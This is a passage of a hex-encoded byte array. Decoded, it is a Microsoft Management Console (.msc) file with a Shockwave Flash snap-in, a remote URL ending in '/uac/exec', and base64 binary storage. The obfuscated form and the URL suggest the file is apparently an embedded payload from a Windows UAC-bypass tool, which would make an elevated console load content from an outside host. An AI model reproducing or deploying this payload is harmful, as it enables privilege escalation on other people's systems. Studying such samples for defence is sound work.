	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65,
	0x6E, 0x74, 0x44, 0x61, 0x74, 0x61, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61,
	0x74, 0x61, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x47, 0x55, 0x49, 0x44, 0x20, 0x4E, 0x61, 0x6D, 0x65, 0x3D, 0x22, 0x53, 0x6E, 0x61,
	0x70, 0x69, 0x6E, 0x22, 0x3E, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x43, 0x2D, 0x30,
	0x45, 0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30,
	0x43, 0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x3C, 0x2F, 0x47, 0x55, 0x49,
	0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x20, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x52, 0x65,
	0x66, 0x49, 0x6E, 0x64, 0x65, 0x78, 0x3D, 0x22, 0x36, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E,
	0x65, 0x6E, 0x74, 0x44, 0x61, 0x74, 0x61, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x2F, 0x43, 0x6F, 0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x44, 0x61, 0x74,
	0x61, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x43, 0x6F,
	0x6D, 0x70, 0x6F, 0x6E, 0x65, 0x6E, 0x74, 0x73, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x2F, 0x4E, 0x6F, 0x64, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x2F, 0x4E, 0x6F, 0x64, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x53, 0x63, 0x6F,
	0x70, 0x65, 0x54, 0x72, 0x65, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6E, 0x73,
	0x6F, 0x6C, 0x65, 0x54, 0x61, 0x73, 0x6B, 0x70, 0x61, 0x64, 0x73, 0x2F, 0x3E, 0x0D, 0x0A, 0x20,
	0x20, 0x3C, 0x56, 0x69, 0x65, 0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x43, 0x61,
	0x63, 0x68, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x54, 0x61, 0x72, 0x67, 0x65,
	0x74, 0x56, 0x69, 0x65, 0x77, 0x20, 0x56, 0x69, 0x65, 0x77, 0x49, 0x44, 0x3D, 0x22, 0x31, 0x22,
	0x20, 0x4E, 0x6F, 0x64, 0x65, 0x54, 0x79, 0x70, 0x65, 0x47, 0x55, 0x49, 0x44, 0x3D, 0x22, 0x7B,
	0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x43, 0x45, 0x2D, 0x30, 0x45, 0x31, 0x37, 0x2D, 0x31, 0x31,
	0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30, 0x43, 0x30, 0x34, 0x46, 0x37, 0x32,
	0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x56,
	0x69, 0x65, 0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x20, 0x46, 0x6C, 0x61, 0x67,
	0x5F, 0x54, 0x61, 0x73, 0x6B, 0x50, 0x61, 0x64, 0x49, 0x44, 0x3D, 0x22, 0x74, 0x72, 0x75, 0x65,
	0x22, 0x20, 0x41, 0x67, 0x65, 0x3D, 0x22, 0x32, 0x22, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x3C, 0x47, 0x55, 0x49, 0x44, 0x3E, 0x7B, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
	0x30, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x30, 0x30, 0x30, 0x30,
	0x2D, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x7D, 0x3C, 0x2F,
	0x47, 0x55, 0x49, 0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x56, 0x69, 0x65,
	0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x3C, 0x54, 0x61, 0x72, 0x67, 0x65, 0x74, 0x56, 0x69, 0x65, 0x77, 0x20, 0x56, 0x69, 0x65, 0x77,
	0x49, 0x44, 0x3D, 0x22, 0x31, 0x22, 0x20, 0x4E, 0x6F, 0x64, 0x65, 0x54, 0x79, 0x70, 0x65, 0x47,
	0x55, 0x49, 0x44, 0x3D, 0x22, 0x7B, 0x43, 0x39, 0x36, 0x34, 0x30, 0x31, 0x44, 0x30, 0x2D, 0x30,
	0x45, 0x31, 0x37, 0x2D, 0x31, 0x31, 0x44, 0x33, 0x2D, 0x38, 0x38, 0x35, 0x42, 0x2D, 0x30, 0x30,
	0x43, 0x30, 0x34, 0x46, 0x37, 0x32, 0x43, 0x37, 0x31, 0x37, 0x7D, 0x22, 0x2F, 0x3E, 0x0D, 0x0A,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x56, 0x69, 0x65, 0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67,
	0x73, 0x20, 0x46, 0x6C, 0x61, 0x67, 0x5F, 0x54, 0x61, 0x73, 0x6B, 0x50, 0x61, 0x64, 0x49, 0x44,
	0x3D, 0x22, 0x74, 0x72, 0x75, 0x65, 0x22, 0x20, 0x41, 0x67, 0x65, 0x3D, 0x22, 0x31, 0x22, 0x3E,
	0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x47, 0x55, 0x49, 0x44, 0x3E, 0x7B, 0x30,
	0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x30, 0x30, 0x30,
	0x30, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30,
	0x30, 0x30, 0x30, 0x7D, 0x3C, 0x2F, 0x47, 0x55, 0x49, 0x44, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20,
	0x20, 0x3C, 0x2F, 0x56, 0x69, 0x65, 0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x3E,
	0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x56, 0x69, 0x65, 0x77, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E,
	0x67, 0x73, 0x43, 0x61, 0x63, 0x68, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x43, 0x6F, 0x6C,
	0x75, 0x6D, 0x6E, 0x53, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67, 0x73, 0x43, 0x61, 0x63, 0x68, 0x65,
	0x2F, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x54, 0x61, 0x62,
	0x6C, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x49, 0x64, 0x65, 0x6E, 0x74,
	0x69, 0x66, 0x69, 0x65, 0x72, 0x50, 0x6F, 0x6F, 0x6C, 0x20, 0x41, 0x62, 0x73, 0x6F, 0x6C, 0x75,
	0x74, 0x65, 0x4D, 0x69, 0x6E, 0x3D, 0x22, 0x31, 0x22, 0x20, 0x41, 0x62, 0x73, 0x6F, 0x6C, 0x75,
	0x74, 0x65, 0x4D, 0x61, 0x78, 0x3D, 0x22, 0x36, 0x35, 0x35, 0x33, 0x35, 0x22, 0x20, 0x4E, 0x65,
	0x78, 0x74, 0x41, 0x76, 0x61, 0x69, 0x6C, 0x61, 0x62, 0x6C, 0x65, 0x3D, 0x22, 0x35, 0x22, 0x2F,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x54, 0x61,
	0x62, 0x6C, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x47, 0x55, 0x49,
	0x44, 0x3E, 0x7B, 0x37, 0x31, 0x45, 0x35, 0x42, 0x33, 0x33, 0x45, 0x2D, 0x31, 0x30, 0x36, 0x34,
	0x2D, 0x31, 0x31, 0x44, 0x32, 0x2D, 0x38, 0x30, 0x38, 0x46, 0x2D, 0x30, 0x30, 0x30, 0x30, 0x46,
	0x38, 0x37, 0x35, 0x41, 0x39, 0x43, 0x45, 0x7D, 0x3C, 0x2F, 0x47, 0x55, 0x49, 0x44, 0x3E, 0x0D,
	0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x73, 0x3E,
	0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E,
	0x67, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x31, 0x22, 0x20, 0x52, 0x65, 0x66, 0x73, 0x3D, 0x22, 0x31,
	0x22, 0x3E, 0x46, 0x61, 0x76, 0x6F, 0x72, 0x69, 0x74, 0x65, 0x73, 0x3C, 0x2F, 0x53, 0x74, 0x72,
	0x69, 0x6E, 0x67, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x53,
	0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x32, 0x22, 0x20, 0x52, 0x65, 0x66,
	0x73, 0x3D, 0x22, 0x32, 0x22, 0x3E, 0x53, 0x68, 0x6F, 0x63, 0x6B, 0x77, 0x61, 0x76, 0x65, 0x20,
	0x46, 0x6C, 0x61, 0x73, 0x68, 0x20, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x3C, 0x2F, 0x53, 0x74,
	0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C,
	0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x49, 0x44, 0x3D, 0x22, 0x33, 0x22, 0x20, 0x52, 0x65,
	0x66, 0x73, 0x3D, 0x22, 0x31, 0x22, 0x3E, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x68,
	0x66, 0x69, 0x72, 0x65, 0x66, 0x30, 0x78, 0x2E, 0x67, 0x69, 0x74, 0x68, 0x75, 0x62, 0x2E, 0x69,
	0x6F, 0x2F, 0x42, 0x65, 0x61, 0x63, 0x6F, 0x6E, 0x2F, 0x75, 0x61, 0x63, 0x2F, 0x65, 0x78, 0x65,
	0x63, 0x3C, 0x2F, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
	0x20, 0x20, 0x20, 0x20, 0x3C, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x20, 0x49, 0x44, 0x3D, 0x22,
	0x34, 0x22, 0x20, 0x52, 0x65, 0x66, 0x73, 0x3D, 0x22, 0x32, 0x22, 0x3E, 0x43, 0x6F, 0x6E, 0x73,
	0x6F, 0x6C, 0x65, 0x20, 0x52, 0x6F, 0x6F, 0x74, 0x3C, 0x2F, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67,
	0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x53, 0x74, 0x72, 0x69, 0x6E,
	0x67, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x3C, 0x2F, 0x53, 0x74, 0x72, 0x69, 0x6E,
	0x67, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x2F, 0x53, 0x74, 0x72,
	0x69, 0x6E, 0x67, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x73, 0x3E, 0x0D, 0x0A, 0x20, 0x20, 0x3C, 0x42,
	0x69, 0x6E, 0x61, 0x72, 0x79, 0x53, 0x74, 0x6F, 0x72, 0x61, 0x67, 0x65, 0x3E, 0x0D, 0x0A, 0x20,
	0x20, 0x20, 0x20, 0x3C, 0x42, 0x69, 0x6E, 0x61, 0x72, 0x79, 0x3E, 0x0D, 0x0A, 0x53, 0x55, 0x77,
	0x42, 0x41, 0x51, 0x49, 0x41, 0x42, 0x41, 0x41, 0x4D, 0x41, 0x42, 0x41, 0x41, 0x45, 0x41, 0x44,
	0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x49, 0x52, 0x44, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F, 0x2F,
	0x2F, 0x2F, 0x30, 0x4A, 0x4E, 0x4E, 0x67, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x32, 0x41, 0x41, 0x41, 0x41, 0x4B, 0x41, 0x41, 0x41, 0x41, 0x45, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x51, 0x41, 0x41, 0x41, 0x41, 0x41, 0x51, 0x41, 0x67, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x45, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x43, 0x63, 0x6E, 0x4A,
	0x30, 0x74, 0x71, 0x61, 0x6D, 0x72, 0x4A, 0x53, 0x30, 0x74, 0x4C, 0x71, 0x67, 0x6B, 0x4A, 0x43,
	0x52, 0x6F, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4C, 0x53, 0x7A, 0x73,
	0x2F, 0x2B, 0x72, 0x71, 0x36, 0x76, 0x2F, 0x0D, 0x0A, 0x71, 0x71, 0x71, 0x71, 0x2F, 0x36, 0x69,
	0x6F, 0x71, 0x50, 0x2B, 0x6F, 0x70, 0x36, 0x66, 0x2F, 0x70, 0x36, 0x65, 0x6E, 0x2F, 0x36, 0x61,
	0x6D, 0x70, 0x76, 0x2B, 0x6D, 0x70, 0x71, 0x62, 0x2F, 0x70, 0x4B, 0x53, 0x6B, 0x2F, 0x36, 0x4F,
	0x6A, 0x6F, 0x2F, 0x38, 0x6E, 0x4A, 0x79, 0x64, 0x4C, 0x61, 0x6D, 0x70, 0x71, 0x79, 0x55, 0x74,
	0x4C, 0x53, 0x36, 0x6F, 0x4A, 0x43, 0x51, 0x6B, 0x61, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x43, 0x30, 0x0D, 0x0A, 0x73, 0x37, 0x50, 0x2F, 0x71, 0x36, 0x75, 0x72, 0x2F,
	0x36, 0x71, 0x71, 0x71, 0x76, 0x2B, 0x6F, 0x71, 0x4B, 0x6A, 0x2F, 0x71, 0x4B, 0x65, 0x6E, 0x2F,
	0x36, 0x65, 0x6E, 0x70, 0x2F, 0x2B, 0x6D, 0x70, 0x71, 0x62, 0x2F, 0x70, 0x71, 0x61, 0x6D, 0x2F,
	0x36, 0x53, 0x6B, 0x70, 0x50, 0x2B, 0x6A, 0x6F, 0x36, 0x50, 0x2F, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x43, 0x4A, 0x69, 0x59, 0x6E, 0x57, 0x0D,
	0x0A, 0x76, 0x4C, 0x79, 0x38, 0x2F, 0x36, 0x57, 0x6C, 0x70, 0x66, 0x2B, 0x42, 0x67, 0x49, 0x44,
	0x2F, 0x6C, 0x5A, 0x53, 0x55, 0x2F, 0x35, 0x57, 0x55, 0x6C, 0x50, 0x2B, 0x32, 0x74, 0x4C, 0x54,
	0x2F, 0x31, 0x4E, 0x48, 0x52, 0x2B, 0x64, 0x54, 0x52, 0x30, 0x66, 0x6E, 0x55, 0x30, 0x64, 0x48,
	0x35, 0x31, 0x4E, 0x48, 0x52, 0x2B, 0x64, 0x54, 0x54, 0x30, 0x66, 0x6E, 0x55, 0x30, 0x39, 0x48,
	0x35, 0x31, 0x64, 0x50, 0x52, 0x2B, 0x63, 0x2F, 0x4F, 0x7A, 0x66, 0x4B, 0x6B, 0x0D, 0x0A, 0x70,
	0x4B, 0x54, 0x2F, 0x69, 0x59, 0x6D, 0x4A, 0x31, 0x72, 0x79, 0x38, 0x76, 0x50, 0x2B, 0x6C, 0x70,
	0x61, 0x58, 0x2F, 0x67, 0x59, 0x43, 0x41, 0x2F, 0x35, 0x57, 0x55, 0x6C, 0x50, 0x2B, 0x56, 0x6C,
	0x4A, 0x54, 0x2F, 0x74, 0x72, 0x53, 0x30, 0x2F, 0x39, 0x54, 0x52, 0x30, 0x66, 0x6E, 0x55, 0x30,
	0x64, 0x48, 0x35, 0x31, 0x4E, 0x48, 0x52, 0x2B, 0x64, 0x54, 0x52, 0x30, 0x66, 0x6E, 0x55, 0x30,
	0x39, 0x48, 0x35, 0x31, 0x4E, 0x50, 0x52, 0x2B, 0x64, 0x58, 0x54, 0x0D, 0x0A, 0x30, 0x66, 0x6E,
	0x50, 0x7A, 0x73, 0x33, 0x79, 0x70, 0x4B, 0x53, 0x6B, 0x2F, 0x77, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x67, 0x59, 0x47, 0x42, 0x76, 0x4E, 0x7A,
	0x63, 0x33, 0x50, 0x2B, 0x31, 0x74, 0x62, 0x58, 0x2F, 0x70, 0x61, 0x43, 0x66, 0x2F, 0x38, 0x61,
	0x39, 0x76, 0x50, 0x2F, 0x47, 0x76, 0x62, 0x7A, 0x2F, 0x75, 0x4C, 0x65, 0x33, 0x2F, 0x39, 0x58,
	0x53, 0x30, 0x66, 0x2F, 0x4E, 0x0D, 0x0A, 0x79, 0x63, 0x6E, 0x2F, 0x7A, 0x63, 0x6E, 0x4A, 0x2F,
	0x38, 0x33, 0x4A, 0x79, 0x66, 0x2F, 0x4E, 0x79, 0x63, 0x6E, 0x2F, 0x7A, 0x63, 0x6E, 0x4A, 0x2F,
	0x38, 0x33, 0x4A, 0x79, 0x66, 0x2F, 0x55, 0x30, 0x64, 0x48, 0x36, 0x70, 0x71, 0x61, 0x6D, 0x2F,
	0x34, 0x47, 0x42, 0x67, 0x62, 0x7A, 0x63, 0x33, 0x4E, 0x7A, 0x2F, 0x74, 0x62, 0x57, 0x31, 0x2F,
	0x36, 0x57, 0x67, 0x6E, 0x2F, 0x2F, 0x47, 0x76, 0x62, 0x7A, 0x2F, 0x78, 0x72, 0x32, 0x38, 0x2F,
	0x37, 0x69, 0x33, 0x0D, 0x0A, 0x74, 0x2F, 0x2F, 0x56, 0x30, 0x74, 0x48, 0x2F, 0x7A, 0x63, 0x6E,
	0x4A, 0x2F, 0x38, 0x33, 0x4A, 0x79, 0x66, 0x2F, 0x4E, 0x79, 0x63, 0x6E, 0x2F, 0x7A, 0x63, 0x6E,
	0x4A, 0x2F, 0x38, 0x33, 0x4A, 0x79, 0x66, 0x2F, 0x4E, 0x79, 0x63, 0x6E, 0x2F, 0x31, 0x4E, 0x48,
	0x52, 0x2B, 0x71, 0x61, 0x6D, 0x70, 0x76, 0x38, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D,
	0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x42, 0x63, 0x58, 0x46, 0x79, 0x5A, 0x57, 0x0D, 0x0A, 0x56,
	0x6C, 0x61, 0x54, 0x4F, 0x54, 0x6B, 0x35, 0x64, 0x67, 0x51, 0x45, 0x42, 0x41, 0x67, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x4C, 0x6D, 0x34, 0x75, 0x50, 0x2F, 0x5A, 0x31,
	0x74, 0x62, 0x2F, 0x7A, 0x4D, 0x6A, 0x49, 0x2F, 0x38, 0x7A, 0x49, 0x79, 0x50, 0x2F, 0x4D, 0x79,
	0x4D, 0x6A, 0x2F, 0x7A, 0x4D, 0x6A, 0x49, 0x2F, 0x38, 0x7A, 0x49, 0x79, 0x50, 0x2F, 0x4D, 0x79,
	0x4D, 0x66, 0x2F, 0x30, 0x63, 0x33, 0x4E, 0x2B, 0x61, 0x61, 0x6D, 0x0D, 0x0A, 0x70, 0x76, 0x38,
	0x58, 0x46, 0x78, 0x63, 0x6D, 0x56, 0x6C, 0x5A, 0x57, 0x6B, 0x7A, 0x6B, 0x35, 0x4F, 0x58, 0x59,
	0x45, 0x42, 0x41, 0x51, 0x49, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x43,
	0x35, 0x75, 0x4C, 0x6A, 0x2F, 0x32, 0x64, 0x62, 0x57, 0x2F, 0x38, 0x7A, 0x49, 0x79, 0x50, 0x2F,
	0x4D, 0x79, 0x4D, 0x6A, 0x2F, 0x7A, 0x4D, 0x6A, 0x49, 0x2F, 0x38, 0x7A, 0x49, 0x79, 0x50, 0x2F,
	0x4D, 0x79, 0x4D, 0x6A, 0x2F, 0x7A, 0x4D, 0x6A, 0x48, 0x0D, 0x0A, 0x2F, 0x39, 0x48, 0x4E, 0x7A,
	0x66, 0x6D, 0x6D, 0x70, 0x71, 0x62, 0x2F, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x0D, 0x0A, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
	0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
